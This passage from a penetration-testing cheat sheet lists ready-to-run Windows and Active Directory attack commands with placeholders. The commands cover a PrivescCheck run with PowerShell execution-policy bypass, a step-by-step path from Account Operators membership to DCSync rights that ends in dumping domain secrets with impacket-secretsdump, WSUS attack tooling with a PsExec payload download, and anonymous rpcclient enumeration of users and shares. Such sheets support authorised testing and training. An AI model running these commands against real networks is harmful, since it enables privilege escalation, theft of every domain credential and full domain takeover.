powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"                                                                         # run PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"    # run extended PrivescCheck report
```

## Account Operators Group → DCSync Path

```bash
net user <USERNAME> <PASSWORD> /add /domain                 # add domain user
net group "Exchange Windows Permissions" /add <USERNAME>    # add user to Exchange Windows Permissions
# Import PowerView, then:
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync    # grant DCSync rights
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'                                                                            # dump domain secrets with new rights
```

## WSUS Testing

```bash
sudo apt install pipx python3-nftables                   # install wsuks prerequisites on Debian/Kali
pipx ensurepath                                          # ensure pipx-installed tools are in PATH
pipx install wsuks --system-site-packages                # install WSUS testing helper in isolated environment
sudo wsuks --help                                        # show WSUS testing options
wget https://live.sysinternals.com/tools/PsExec64.exe    # download PsExec64 for authorized lab payload testing
```

## rpcclient

```bash
rpcclient -U "" <RHOST>                                                   # connect anonymously to RPC
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c enumdomusers              # enumerate domain users
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c "queryuser <USERNAME>"    # query user details
rpcclient -U '<USERNAME>%<PASSWORD>' <RHOST> -c "netshareenumall"         # enumerate SMB shares
```
